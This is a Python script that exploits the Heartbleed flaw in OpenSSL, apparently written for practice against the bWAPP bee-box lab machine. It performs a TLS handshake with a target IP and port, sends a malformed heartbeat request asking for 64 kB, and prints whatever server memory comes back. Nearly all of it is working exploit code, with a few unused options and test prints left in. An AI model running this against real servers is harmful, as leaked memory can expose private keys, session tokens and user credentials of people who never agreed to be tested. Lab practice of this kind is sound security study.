#!/usr/bin/python3
'''
vulnerable web server: https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/#
'''
import sys
import struct
import socket
import time
import select
import os
import argparse
import codecs

def main():
    '''
    TODO: main stuff
    '''
    parser = argparse.ArgumentParser()
    reqd = parser.add_argument_group('required arguments')
    reqd.add_argument('-t','--target',action='store',dest='tar',help='Target IP')
    reqd.add_argument('-p','--port',action='store',dest='prt',help='Target port')
    parser.add_argument('-o','--output',action='store',dest='out',help='Output file')
    parser.add_argument('-c','--creds',action='store_true',dest='creds',help='Print any creds only')

    args = parser.parse_args()
    os.system('')
    effect = effects()
    print(effect.g_prefix)
    print(effect.b_prefix)
    print(effect.w_prefix)
    print(effect.bl_prefix)
    print(effect.warn_msg("TEST STRING"))
    print(effect.err_msg("TEST STRING"))
    print(effect.good_msg("TEST STRING"))
    print(effect.blue_msg("TEST STRING"))

    helloPacket = (
        '16 03 02 00 31' # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
        '01 00 00 2d'	 # Message type = 01 (client hello); Length = 00 00 2d
        '03 02' 		 # Client version = 03 02 (TLS 1.1)
        '50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
        '00' 			 # Session id = 00
        '00 04 ' 		 # Cipher suite length
        '00 33 c0 11'	 # 4 cipher suites
        '01'			 # Compression methods length
        '00'			 # Compression method 0: no compression = 0
        '00 00'			 # Extensions length = 0
    ).replace(' ', '')

    helloPacket = codecs.decode(helloPacket, 'hex')
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting...")
    sys.stdout.flush()
    sock.connect((args.tar, int(args.prt)))
    print("Sending Client Hello...")
    sys.stdout.flush()
    sock.send(helloPacket)
    print("Waiting for Server Hello...")
    sys.stdout.flush()
    # Receive packets until we get a hello done packet
    while True:
        contentType, version, payload = receiveTLSMessage(sock)
        if contentType == None:
            print("Server closed connection without sending Server Hello.")
            return
        # Look for server hello done message.
        #print(payload[0])
        if contentType == 22 and payload[0] == 0x0E:
            #if len(str(payload[0])) == 1:
            #    if ord(str(payload[0])) == 0x0E:
            break
  
    print("Sending heartbeat request...")
    sys.stdout.flush()
    # Jared Stafford's version sends heartbleed packet here too. It may be a bug.
    exploit(sock)

def exploit(sock):
    heartbleedPacket = (
        '18 03 02 00 03' # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
        '01 FF FF'		 # Heartbeat message type = 01 (request); Payload length = FF FF
    ).replace(' ', '')

    heartbleedPacket = codecs.decode(heartbleedPacket, 'hex')
    sock.send(heartbleedPacket)
	# We asked for 64 kB, so we should get 4 packets
    contentType, version, payload = receiveTLSMessage(sock, 4)
    if contentType is None:
        print("No heartbeat response received, server likely not vulnerable")
        return False

    if contentType == 24:
        print("Received heartbeat response:")
        dmp_pkt_data(payload)
        if len(payload) > 3:
            print("WARNING: server returned more data than it should - server is vulnerable!")
        else:
            print("Server processed malformed heartbeat, but did not return any extra data.")
        return True

    if contentType == 21:
        print("Received alert:")
        dmp_pkt_data(payload)
        print("Server returned error, likely not vulnerable")
        return False


def recv_pkt(sock, length):
    timeout = 5
    t_end = time.time() + timeout
    recv_data = b''
    remain = length
    while remain > 0:
        recv_time = t_end - time.time()
        if recv_time < 0:
            return None
        r, w, e = select.select([sock],[],[],5)
        if sock in r:
            data = sock.recv(remain)
            if not data:
                return None
            recv_data += data
            remain -= len(data)
    return recv_data

def receiveTLSMessage(sock, fragments = 1):
    contentType = None
    version = None
    length = None
    payload = b''
	
    # The server may send less fragments. Because of that, this will return partial data.
    for fragmentIndex in range(0, fragments):
        tlsHeader = recv_pkt(sock, 5) # Receive 5 byte header (Content type, version, and length)
	
        if tlsHeader is None:
            print("Unexpected EOF receiving record header - server closed connection")
            return contentType, version, payload # Return what we currently have
	
        contentType, version, length = struct.unpack('>BHH', tlsHeader) # Unpack the header
        payload_tmp = recv_pkt(sock, length) # Receive the data that the server told us it'd send

        if payload_tmp is None:
            print("Unexpected EOF receiving record payload - server closed connection")
            return contentType, version, payload # Return what we currently have
	
        print("Received message: type = %d, ver = %04x, length = %d" % (contentType, version, len(payload_tmp)))
	
        payload = payload + payload_tmp
	
    return contentType, version, payload

def dmp_pkt_data(sock):
    data = ''.join((str(c) if 32 <= c <= 126 else '.' ) for c in sock)
    print("%s"% data)

class effects(object):
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    g_prefix = "["+GREEN+"*"+ENDC+"]"
    b_prefix = "["+RED+"*"+ENDC+"]"
    w_prefix = "["+YELLOW+"*"+ENDC+"]"
    bl_prefix = "["+BLUE+"*"+ENDC+"]"
    
    def warn_msg(self, in_str):
        return self.YELLOW+in_str+self.ENDC
    
    def err_msg(self, in_str):
        return self.RED+in_str+self.ENDC
    
    def good_msg(self, in_str):
        return self.GREEN+in_str+self.ENDC

    def blue_msg(self, in_str):
        return self.BLUE+in_str+self.ENDC

if __name__ == "__main__":
    main()
